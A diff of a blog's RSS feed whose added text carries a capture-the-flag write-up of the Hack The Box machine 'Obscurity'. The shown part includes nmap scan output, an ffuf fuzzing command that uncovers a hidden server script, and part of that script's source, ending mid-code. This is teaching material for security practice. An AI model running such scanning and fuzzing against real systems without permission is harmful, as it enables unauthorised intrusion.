@@ -1,2 +1,930 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>code-analysis on Ceso Adventures</title><link>https://ceso.github.io/tags/code-analysis/</link><description>Recent content in code-analysis on Ceso Adventures</description><generator>Hugo -- gohugo.io</generator><lastBuildDate>Thu, 14 May 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://ceso.github.io/tags/code-analysis/index.xml" rel="self" type="application/rss+xml"/><item><title>Hack The Box - Obscurity</title><link>https://ceso.github.io/posts/2020/05/hack-the-box-obscurity/</link><pubDate>Thu, 14 May 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/05/hack-the-box-obscurity/</guid><description>Quick Summary Well, the last months I have been really away from doing write-ups, specifically due to being full focused on my OSCP which I still can&amp;rsquo;t belive I passed!! I did an extensive write up about my experience going through it, if you still haven&amp;rsquo;t read it you can click here to go to it
-I have more machines to do a write-up of, for example some of them are Postman, Traverxec, Mango, SolidState, OpenAdmin, Chatter Box among others, but well&amp;hellip;I will try to do them as my time allows me hehe.</description></item><item><title>Hack The Box - Craft</title><link>https://ceso.github.io/posts/2020/01/hack-the-box-craft/</link><pubDate>Sat, 04 Jan 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/01/hack-the-box-craft/</guid><description>Quick Summary So!! Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot @Fugl!</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>code-analysis on Ceso Adventures</title><link>https://ceso.github.io/tags/code-analysis/</link><description>Recent content in code-analysis on Ceso Adventures</description><generator>Hugo -- gohugo.io</generator><lastBuildDate>Thu, 14 May 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://ceso.github.io/tags/code-analysis/index.xml" rel="self" type="application/rss+xml"/><item><title>Hack The Box - Obscurity</title><link>https://ceso.github.io/posts/2020/05/hack-the-box-obscurity/</link><pubDate>Thu, 14 May 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/05/hack-the-box-obscurity/</guid><description>
+&lt;img src="https://ceso.github.io/images/htb/obscurity/info-card.png" class="center" style="border-radius: 8px;" />
+&lt;h2 id="quick-summary">Quick Summary&lt;/h2>
+&lt;p>Well, the last months I have been really away from doing write-ups, specifically due to being full focused on my OSCP which I still can&amp;rsquo;t belive I passed!! I did an extensive write up about my experience going through it, if you still haven&amp;rsquo;t read it &lt;a href="https://ceso.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/">you can click here to go to it&lt;/a>&lt;/p>
+&lt;p>I have more machines to do a write-up of, for example some of them are Postman, Traverxec, Mango, SolidState, OpenAdmin, Chatter Box among others, but well&amp;hellip;I will try to do them as my time allows me hehe.&lt;/p>
+&lt;p>For today I just decided to write about Obscurity, which I remember when I did it, it was pretty fun, I enjoyed it quite a lot, and it teach me some nice stuff, still remember when I did it I was struggling a bit with the Python stuff and my bro &lt;a href="https://bullsec.xyz/">MrBulldops&lt;/a> gave me a hand to understand it a bit better.&lt;/p>
+&lt;p>Well, Obscurity is a Linux medium machine, mostly using Python stuff and as the name says before hand, the concept in this one is security by obscurity, so it doesn&amp;rsquo;t use standard web servers and so on, instead it use custom stuff in order to &amp;ldquo;provide security&amp;rdquo; by there being not public ways to exploit it, so you are forced to do some code review, think outside the box, etc.&lt;/p>
+&lt;p>Cutting the chit-chat let&amp;rsquo;s go into the write up!&lt;/p>
+&lt;h2 id="nmap">Nmap&lt;/h2>
+&lt;p>We start with nmap to see which ports are there open:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# nmap -sC -sV -O 10.10.10.168 -o initial-nmap-obscurity.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-17 16:42 EST
+Nmap scan report for 10.10.10.168
+Host is up (0.084s latency).
+Not shown: 996 filtered ports
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+| 2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
+| 256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
+|_ 256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
+80/tcp closed http
+8080/tcp open http-proxy BadHTTPServer
+| fingerprint-strings:
+| GetRequest:
+| HTTP/1.1 200 OK
+| Date: Tue, 17 Dec 2019 21:42:22
+| Server: BadHTTPServer
+| Last-Modified: Tue, 17 Dec 2019 21:42:22
+| Content-Length: 4171
+| Content-Type: text/html
+| Connection: Closed
+| &amp;lt;!DOCTYPE html&amp;gt;
+| &amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
+| &amp;lt;head&amp;gt;
+| &amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;
+| &amp;lt;title&amp;gt;0bscura&amp;lt;/title&amp;gt;
+| &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;IE=Edge&amp;quot;&amp;gt;
+| &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1&amp;quot;&amp;gt;
+| &amp;lt;meta name=&amp;quot;keywords&amp;quot; content=&amp;quot;&amp;quot;&amp;gt;
+| &amp;lt;meta name=&amp;quot;description&amp;quot; content=&amp;quot;&amp;quot;&amp;gt;
+| &amp;lt;!--
+| Easy Profile Template
+| http://www.templatemo.com/tm-467-easy-profile
+| &amp;lt;!-- stylesheet css --&amp;gt;
+| &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;css/bootstrap.min.css&amp;quot;&amp;gt;
+| &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;css/font-awesome.min.css&amp;quot;&amp;gt;
+| &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;css/templatemo-blue.css&amp;quot;&amp;gt;
+| &amp;lt;/head&amp;gt;
+| &amp;lt;body data-spy=&amp;quot;scroll&amp;quot; data-target=&amp;quot;.navbar-collapse&amp;quot;&amp;gt;
+| &amp;lt;!-- preloader section --&amp;gt;
+| &amp;lt;!--
+| &amp;lt;div class=&amp;quot;preloader&amp;quot;&amp;gt;
+| &amp;lt;div class=&amp;quot;sk-spinner sk-spinner-wordpress&amp;quot;&amp;gt;
+| HTTPOptions:
+| HTTP/1.1 200 OK
+| Date: Tue, 17 Dec 2019 21:42:23
+| Server: BadHTTPServer
+| Last-Modified: Tue, 17 Dec 2019 21:42:23
+| Content-Length: 4171
+| Content-Type: text/html
+| Connection: Closed
+| &amp;lt;!DOCTYPE html&amp;gt;
+| &amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
+| &amp;lt;head&amp;gt;
+| &amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;
+| &amp;lt;title&amp;gt;0bscura&amp;lt;/title&amp;gt;
+| &amp;lt;meta http-equiv=&amp;quot;X-UA-Compatible&amp;quot; content=&amp;quot;IE=Edge&amp;quot;&amp;gt;
+| &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1&amp;quot;&amp;gt;
+| &amp;lt;meta name=&amp;quot;keywords&amp;quot; content=&amp;quot;&amp;quot;&amp;gt;
+| &amp;lt;meta name=&amp;quot;description&amp;quot; content=&amp;quot;&amp;quot;&amp;gt;
+| &amp;lt;!--
+| Easy Profile Template
+| http://www.templatemo.com/tm-467-easy-profile
+| &amp;lt;!-- stylesheet css --&amp;gt;
+| &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;css/bootstrap.min.css&amp;quot;&amp;gt;
+| &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;css/font-awesome.min.css&amp;quot;&amp;gt;
+| &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;css/templatemo-blue.css&amp;quot;&amp;gt;
+| &amp;lt;/head&amp;gt;
+| &amp;lt;body data-spy=&amp;quot;scroll&amp;quot; data-target=&amp;quot;.navbar-collapse&amp;quot;&amp;gt;
+| &amp;lt;!-- preloader section --&amp;gt;
+| &amp;lt;!--
+| &amp;lt;div class=&amp;quot;preloader&amp;quot;&amp;gt;
+|_ &amp;lt;div class=&amp;quot;sk-spinner sk-spinner-wordpress&amp;quot;&amp;gt;
+|_http-server-header: BadHTTPServer
+|_http-title: 0bscura
+9000/tcp closed cslistener
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.80%I=7%D=12/17%Time=5DF94BCA%P=x86_64-pc-linux-gnu%r(G
+SF:etRequest,10FC,&amp;quot;HTTP/1\.1\x20200\x20OK\nDate:\x20Tue,\x2017\x20Dec\x202
+SF:019\x2021:42:22\nServer:\x20BadHTTPServer\nLast-Modified:\x20Tue,\x2017
+SF:\x20Dec\x202019\x2021:42:22\nContent-Length:\x204171\nContent-Type:\x20
+SF:text/html\nConnection:\x20Closed\n\n&amp;lt;!DOCTYPE\x20html&amp;gt;\n&amp;lt;html\x20lang=\
+SF:&amp;quot;en\&amp;quot;&amp;gt;\n&amp;lt;head&amp;gt;\n\t&amp;lt;meta\x20charset=\&amp;quot;utf-8\&amp;quot;&amp;gt;\n\t&amp;lt;title&amp;gt;0bscura&amp;lt;/title&amp;gt;
+SF:\n\t&amp;lt;meta\x20http-equiv=\&amp;quot;X-UA-Compatible\&amp;quot;\x20content=\&amp;quot;IE=Edge\&amp;quot;&amp;gt;\n\t
+SF:&amp;lt;meta\x20name=\&amp;quot;viewport\&amp;quot;\x20content=\&amp;quot;width=device-width,\x20initial-
+SF:scale=1\&amp;quot;&amp;gt;\n\t&amp;lt;meta\x20name=\&amp;quot;keywords\&amp;quot;\x20content=\&amp;quot;\&amp;quot;&amp;gt;\n\t&amp;lt;meta\x20n
+SF:ame=\&amp;quot;description\&amp;quot;\x20content=\&amp;quot;\&amp;quot;&amp;gt;\n&amp;lt;!--\x20\nEasy\x20Profile\x20Temp
+SF:late\nhttp://www\.templatemo\.com/tm-467-easy-profile\n--&amp;gt;\n\t&amp;lt;!--\x20s
+SF:tylesheet\x20css\x20--&amp;gt;\n\t&amp;lt;link\x20rel=\&amp;quot;stylesheet\&amp;quot;\x20href=\&amp;quot;css/bo
+SF:otstrap\.min\.css\&amp;quot;&amp;gt;\n\t&amp;lt;link\x20rel=\&amp;quot;stylesheet\&amp;quot;\x20href=\&amp;quot;css/font-
+SF:awesome\.min\.css\&amp;quot;&amp;gt;\n\t&amp;lt;link\x20rel=\&amp;quot;stylesheet\&amp;quot;\x20href=\&amp;quot;css/templ
+SF:atemo-blue\.css\&amp;quot;&amp;gt;\n&amp;lt;/head&amp;gt;\n&amp;lt;body\x20data-spy=\&amp;quot;scroll\&amp;quot;\x20data-targe
+SF:t=\&amp;quot;\.navbar-collapse\&amp;quot;&amp;gt;\n\n&amp;lt;!--\x20preloader\x20section\x20--&amp;gt;\n&amp;lt;!--\n
+SF:&amp;lt;div\x20class=\&amp;quot;preloader\&amp;quot;&amp;gt;\n\t&amp;lt;div\x20class=\&amp;quot;sk-spinner\x20sk-spinne
+SF:r-wordpress\&amp;quot;&amp;gt;\n&amp;quot;)%r(HTTPOptions,10FC,&amp;quot;HTTP/1\.1\x20200\x20OK\nDate:\x2
+SF:0Tue,\x2017\x20Dec\x202019\x2021:42:23\nServer:\x20BadHTTPServer\nLast-
+SF:Modified:\x20Tue,\x2017\x20Dec\x202019\x2021:42:23\nContent-Length:\x20
+SF:4171\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n&amp;lt;!DOCTYPE\x2
+SF:0html&amp;gt;\n&amp;lt;html\x20lang=\&amp;quot;en\&amp;quot;&amp;gt;\n&amp;lt;head&amp;gt;\n\t&amp;lt;meta\x20charset=\&amp;quot;utf-8\&amp;quot;&amp;gt;\n\
+SF:t&amp;lt;title&amp;gt;0bscura&amp;lt;/title&amp;gt;\n\t&amp;lt;meta\x20http-equiv=\&amp;quot;X-UA-Compatible\&amp;quot;\x20c
+SF:ontent=\&amp;quot;IE=Edge\&amp;quot;&amp;gt;\n\t&amp;lt;meta\x20name=\&amp;quot;viewport\&amp;quot;\x20content=\&amp;quot;width=de
+SF:vice-width,\x20initial-scale=1\&amp;quot;&amp;gt;\n\t&amp;lt;meta\x20name=\&amp;quot;keywords\&amp;quot;\x20cont
+SF:ent=\&amp;quot;\&amp;quot;&amp;gt;\n\t&amp;lt;meta\x20name=\&amp;quot;description\&amp;quot;\x20content=\&amp;quot;\&amp;quot;&amp;gt;\n&amp;lt;!--\x20\n
+SF:Easy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-pr
+SF:ofile\n--&amp;gt;\n\t&amp;lt;!--\x20stylesheet\x20css\x20--&amp;gt;\n\t&amp;lt;link\x20rel=\&amp;quot;styles
+SF:heet\&amp;quot;\x20href=\&amp;quot;css/bootstrap\.min\.css\&amp;quot;&amp;gt;\n\t&amp;lt;link\x20rel=\&amp;quot;styleshee
+SF:t\&amp;quot;\x20href=\&amp;quot;css/font-awesome\.min\.css\&amp;quot;&amp;gt;\n\t&amp;lt;link\x20rel=\&amp;quot;styleshee
+SF:t\&amp;quot;\x20href=\&amp;quot;css/templatemo-blue\.css\&amp;quot;&amp;gt;\n&amp;lt;/head&amp;gt;\n&amp;lt;body\x20data-spy=\
+SF:&amp;quot;scroll\&amp;quot;\x20data-target=\&amp;quot;\.navbar-collapse\&amp;quot;&amp;gt;\n\n&amp;lt;!--\x20preloader\x2
+SF:0section\x20--&amp;gt;\n&amp;lt;!--\n&amp;lt;div\x20class=\&amp;quot;preloader\&amp;quot;&amp;gt;\n\t&amp;lt;div\x20class=\&amp;quot;
+SF:sk-spinner\x20sk-spinner-wordpress\&amp;quot;&amp;gt;\n&amp;quot;);
+Aggressive OS guesses: Linux 3.2 - 4.9 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.18 (92%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.16 (91%), Crestron XPanel control system (91%), Android 4.1.1 (91%), Adtran 424RG FTTH gateway (90%), Linux 2.6.32 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.20 seconds
+&lt;/code>&lt;/pre>&lt;p>We got port port 22 (SSH) and 8080 (HTTP Alternative) as open, and a header &amp;ldquo;BadHTTPServer&amp;rdquo; in port 8080.&lt;/p>
+&lt;h2 id="web-enumeration">Web enumeration&lt;/h2>
+&lt;p>From this on, we start doing some manual web enumeration, to see if we find something interesting for us.
+There are some sections in the page talking about the service by obscurity and providing information on another &amp;ldquo;products&amp;rdquo; that are built by &amp;ldquo;the company&amp;rdquo; as well some contact information.&lt;/p>
+&lt;img src="https://ceso.github.io/images/htb/obscurity/1-webenum.png" class="center" style="border-radius: 8px;" />
+&lt;img src="https://ceso.github.io/images/htb/obscurity/2-webenum.png" class="center" style="border-radius: 8px;" />
+&lt;img src="https://ceso.github.io/images/htb/obscurity/3-webenum.png" class="center" style="border-radius: 8px;" />
+&lt;p>In the bottom of the page, there was a mention to &amp;ldquo;Easy Profile&amp;rdquo;:&lt;/p>
+&lt;img src="https://ceso.github.io/images/htb/obscurity/4-webenum.png" class="center" style="border-radius: 8px;" />
+&lt;p>I look up on google for this, and I found this:&lt;/p>
+&lt;img src="https://ceso.github.io/images/htb/obscurity/5-webenum.png" class="center" style="border-radius: 8px;" />
+&lt;p>After trying to enumerate a few more stuff without any luck, I notice is a rabbit hole and just move on.
+I run gobuster against the server, but no luck, it didn&amp;rsquo;t find any directory, common file, absolutely nothing under the server, the only ports we have are ssh and the http 8080, being ssh is almost not possible to be the foothold, and keeping in mind the name of the machine, I decide to move into fuzzing the server to see if I can find anything usefull that gobuster was not able to find. For this I decide to use &lt;code>ffuf&lt;/code> (I don&amp;rsquo;t like wfuzz, neither it&amp;rsquo;s syntax and also I consider it to be slow compared to ffuf), &lt;a href="https://github.com/ffuf/ffuf">you can get ffuf here&lt;/a>.&lt;/p>
+&lt;p>Then I proceed to fuzze the server and I got some interesting results:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# ffuf -D -mc 200 -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o obscurity-ffuf.htb
+/'___\ /'___\ /'___\
+/\ \__/ /\ \__/ __ __ /\ \__/
+\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+\ \_\ \ \_\ \ \____/ \ \_\
+\/_/ \/_/ \/___/ \/_/
+v0.12
+________________________________________________
+:: Method : GET
+:: URL : http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
+:: Output file : obscurity-ffuf.htb
+:: File format : json
+:: Follow redirects : false
+:: Calibration : false
+:: Timeout : 10
+:: Threads : 40
+:: Matcher : Response status: 200
+________________________________________________
+--- SNIP ---
+develop [Status: 200, Size: 5892, Words: 1806, Lines: 171]
+:: Progress: [87664/87664] :: 306 req/sec :: Duration: [0:04:46] :: Errors: 4 ::
+&lt;/code>&lt;/pre>&lt;p>&lt;code>SuperSecureServer.py&lt;/code> under &lt;code>develop&lt;/code> was found, which is something that sounds quite inteteresting, I open my browser and go against &lt;code>http://10.10.10.168:8080/develop/SuperSecureServer.py&lt;/code>, and the next code is show:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> threading
+&lt;span style="color:#f92672">from&lt;/span> datetime &lt;span style="color:#f92672">import&lt;/span> datetime
+&lt;span style="color:#f92672">import&lt;/span> sys
+&lt;span style="color:#f92672">import&lt;/span> os
+&lt;span style="color:#f92672">import&lt;/span> mimetypes
+&lt;span style="color:#f92672">import&lt;/span> urllib.parse
+&lt;span style="color:#f92672">import&lt;/span> subprocess
+respTemplate &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;HTTP/1.1 {statusNum} {statusCode}
+&lt;/span>&lt;span style="color:#e6db74">Date: {dateSent}
+&lt;/span>&lt;span style="color:#e6db74">Server: {server}
+&lt;/span>&lt;span style="color:#e6db74">Last-Modified: {modified}
+&lt;/span>&lt;span style="color:#e6db74">Content-Length: {length}
+&lt;/span>&lt;span style="color:#e6db74">Content-Type: {contentType}
+&lt;/span>&lt;span style="color:#e6db74">Connection: {connectionType}
+&lt;/span>&lt;span style="color:#e6db74">
+&lt;/span>&lt;span style="color:#e6db74">{body}
+&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;&lt;/span>
+DOC_ROOT &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;DocRoot&amp;#34;&lt;/span>
+CODES &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#e6db74">&amp;#34;200&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;OK&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;304&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;NOT MODIFIED&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;400&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;BAD REQUEST&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;401&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;UNAUTHORIZED&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;403&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;FORBIDDEN&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;404&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;NOT FOUND&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;500&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;INTERNAL SERVER ERROR&amp;#34;&lt;/span>}
+MIMES &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#e6db74">&amp;#34;txt&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;text/plain&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;css&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;text/css&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;html&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;text/html&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;png&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;image/png&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;jpg&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;image/jpg&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;ttf&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;application/octet-stream&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;otf&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;application/octet-stream&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;woff&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;font/woff&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;woff2&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;font/woff2&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;js&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;application/javascript&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;gz&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;application/zip&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;py&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;text/plain&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;map&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;application/octet-stream&amp;#34;&lt;/span>}
+&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Response&lt;/span>:
+&lt;span style="color:#66d9ef">def&lt;/span> __init__(self, &lt;span style="color:#f92672">**&lt;/span>kwargs):
+self&lt;span style="color:#f92672">.&lt;/span>__dict__&lt;span style="color:#f92672">.&lt;/span>update(kwargs)
+now &lt;span style="color:#f92672">=&lt;/span> datetime&lt;span style="color:#f92672">.&lt;/span>now()
+self&lt;span style="color:#f92672">.&lt;/span>dateSent &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>modified &lt;span style="color:#f92672">=&lt;/span> now&lt;span style="color:#f92672">.&lt;/span>strftime(&lt;span style="color:#e6db74">&amp;#34;%a, &lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74"> %b %Y %H:%M:%S&amp;#34;&lt;/span>)
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">stringResponse&lt;/span>(self):
+&lt;span style="color:#66d9ef">return&lt;/span> respTemplate&lt;span style="color:#f92672">.&lt;/span>format(&lt;span style="color:#f92672">**&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>__dict__)
+&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Request&lt;/span>:
+&lt;span style="color:#66d9ef">def&lt;/span> __init__(self, request):
+self&lt;span style="color:#f92672">.&lt;/span>good &lt;span style="color:#f92672">=&lt;/span> True
+&lt;span style="color:#66d9ef">try&lt;/span>:
+request &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>parseRequest(request)
+self&lt;span style="color:#f92672">.&lt;/span>method &lt;span style="color:#f92672">=&lt;/span> request[&lt;span style="color:#e6db74">&amp;#34;method&amp;#34;&lt;/span>]
+self&lt;span style="color:#f92672">.&lt;/span>doc &lt;span style="color:#f92672">=&lt;/span> request[&lt;span style="color:#e6db74">&amp;#34;doc&amp;#34;&lt;/span>]
+self&lt;span style="color:#f92672">.&lt;/span>vers &lt;span style="color:#f92672">=&lt;/span> request[&lt;span style="color:#e6db74">&amp;#34;vers&amp;#34;&lt;/span>]
+self&lt;span style="color:#f92672">.&lt;/span>header &lt;span style="color:#f92672">=&lt;/span> request[&lt;span style="color:#e6db74">&amp;#34;header&amp;#34;&lt;/span>]
+self&lt;span style="color:#f92672">.&lt;/span>body &lt;span style="color:#f92672">=&lt;/span> request[&lt;span style="color:#e6db74">&amp;#34;body&amp;#34;&lt;/span>]
+&lt;span style="color:#66d9ef">except&lt;/span>:
+self&lt;span style="color:#f92672">.&lt;/span>good &lt;span style="color:#f92672">=&lt;/span> False
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">parseRequest&lt;/span>(self, request):
+req &lt;span style="color:#f92672">=&lt;/span> request&lt;span style="color:#f92672">.&lt;/span>strip(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\r&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
+method,doc,vers &lt;span style="color:#f92672">=&lt;/span> req[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#34; &amp;#34;&lt;/span>)
+header &lt;span style="color:#f92672">=&lt;/span> req[&lt;span style="color:#ae81ff">1&lt;/span>:&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>]
+body &lt;span style="color:#f92672">=&lt;/span> req[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]
+headerDict &lt;span style="color:#f92672">=&lt;/span> {}
+&lt;span style="color:#66d9ef">for&lt;/span> param &lt;span style="color:#f92672">in&lt;/span> header:
+pos &lt;span style="color:#f92672">=&lt;/span> param&lt;span style="color:#f92672">.&lt;/span>find(&lt;span style="color:#e6db74">&amp;#34;: &amp;#34;&lt;/span>)
+key, val &lt;span style="color:#f92672">=&lt;/span> param[:pos], param[pos&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>:]
+headerDict&lt;span style="color:#f92672">.&lt;/span>update({key: val})
+&lt;span style="color:#66d9ef">return&lt;/span> {&lt;span style="color:#e6db74">&amp;#34;method&amp;#34;&lt;/span>: method, &lt;span style="color:#e6db74">&amp;#34;doc&amp;#34;&lt;/span>: doc, &lt;span style="color:#e6db74">&amp;#34;vers&amp;#34;&lt;/span>: vers, &lt;span style="color:#e6db74">&amp;#34;header&amp;#34;&lt;/span>: headerDict, &lt;span style="color:#e6db74">&amp;#34;body&amp;#34;&lt;/span>: body}
+&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Server&lt;/span>:
+&lt;span style="color:#66d9ef">def&lt;/span> __init__(self, host, port):
+self&lt;span style="color:#f92672">.&lt;/span>host &lt;span style="color:#f92672">=&lt;/span> host
+self&lt;span style="color:#f92672">.&lt;/span>port &lt;span style="color:#f92672">=&lt;/span> port
+self&lt;span style="color:#f92672">.&lt;/span>sock &lt;span style="color:#f92672">=&lt;/span> socket&lt;span style="color:#f92672">.&lt;/span>socket(socket&lt;span style="color:#f92672">.&lt;/span>AF_INET, socket&lt;span style="color:#f92672">.&lt;/span>SOCK_STREAM)
+self&lt;span style="color:#f92672">.&lt;/span>sock&lt;span style="color:#f92672">.&lt;/span>setsockopt(socket&lt;span style="color:#f92672">.&lt;/span>SOL_SOCKET, socket&lt;span style="color:#f92672">.&lt;/span>SO_REUSEADDR, &lt;span style="color:#ae81ff">1&lt;/span>)
+self&lt;span style="color:#f92672">.&lt;/span>sock&lt;span style="color:#f92672">.&lt;/span>bind((self&lt;span style="color:#f92672">.&lt;/span>host, self&lt;span style="color:#f92672">.&lt;/span>port))
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">listen&lt;/span>(self):
+self&lt;span style="color:#f92672">.&lt;/span>sock&lt;span style="color:#f92672">.&lt;/span>listen(&lt;span style="color:#ae81ff">5&lt;/span>)
+&lt;span style="color:#66d9ef">while&lt;/span> True:
+client, address &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>sock&lt;span style="color:#f92672">.&lt;/span>accept()
+client&lt;span style="color:#f92672">.&lt;/span>settimeout(&lt;span style="color:#ae81ff">60&lt;/span>)
